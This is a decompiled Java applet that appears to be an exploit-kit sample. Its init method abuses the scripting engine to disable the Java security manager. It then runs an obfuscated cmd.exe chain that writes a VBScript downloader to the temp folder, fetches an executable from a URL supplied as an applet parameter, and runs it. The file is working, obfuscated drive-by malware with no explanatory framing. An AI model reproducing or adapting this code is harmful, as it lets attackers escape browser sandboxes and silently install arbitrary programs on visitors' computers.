import javax.script.ScriptEngine;
import javax.script.ScriptException;
import java.awt.Component;
import javax.script.ScriptEngineManager;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class kwewd extends Applet
{
    private JList list;
    
    @Override
    public void init() {
        try {
            final ScriptEngine engineByName = new ScriptEngineManager().getEngineByName("js");
            final String parameter = this.getParameter("data");
            final String s = "c";
            final String s2 = "d";
            final String s3 = "e";
            final String string = s + "m" + s2 + "." + s3 + "x" + s3;
            engineByName.eval("var error = new Error(\"My error\");this.toString = function(){ java.lang.System.setSecurityManager(null);java.lang.Runtime.getRuntime().exec('" + string + " /c echo URL = LCase(WScript.Arguments(0))>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo dim m,s>>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo m=\"M^weww^i^weww^c^weww^r^weww^o^weww^s^weww^o^weww^f^weww^t^weww^.^weww^X^weww^M^weww^L^weww^H^weww^T^weww^T^weww^P\">>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo s=\"A=YRWE=D=YRWE=O=YRWE=DB=YRWE=.=YRWE=S=YRWE=t=YRWE=r=YRWE=e=YRWE=a=YRWE=m\">>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo set cmd =Createobject(replace(m,\"^weww^\",\"\")) >>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo cmd.Open \"GET\",URL,0 >>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo cmd.Send()>>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo FileName=LCase(WScript.Arguments(1))>>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo Set CsCriptGet = Createobject(replace(s,\"=YRWE=\",\"\"))>>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo CsCriptGet.Mode=^3>>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo CsCriptGet.Type=^1>>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo CsCriptGet.Open()>>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo CsCriptGet.Write(cmd.responseBody)>>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c echo CsCriptGet.SaveToFile FileName,^2>>\"%temp%\\\\tmpueer.vbs\"&&" + string + " /c cscript \"%temp%\\\\tmpueer.vbs\" " + parameter + " \"%temp%\\\\tmp8342335.exe\"&& \"%temp%\\\\tmp8342335.exe\"');" + "return \"OK!!!!\";};" + "error.message = this;");
            this.add(this.list = new JList(new Object[] { engineByName.get("error") }));
        }
        catch (ScriptException ex) {
            ex.printStackTrace();
        }
    }
}
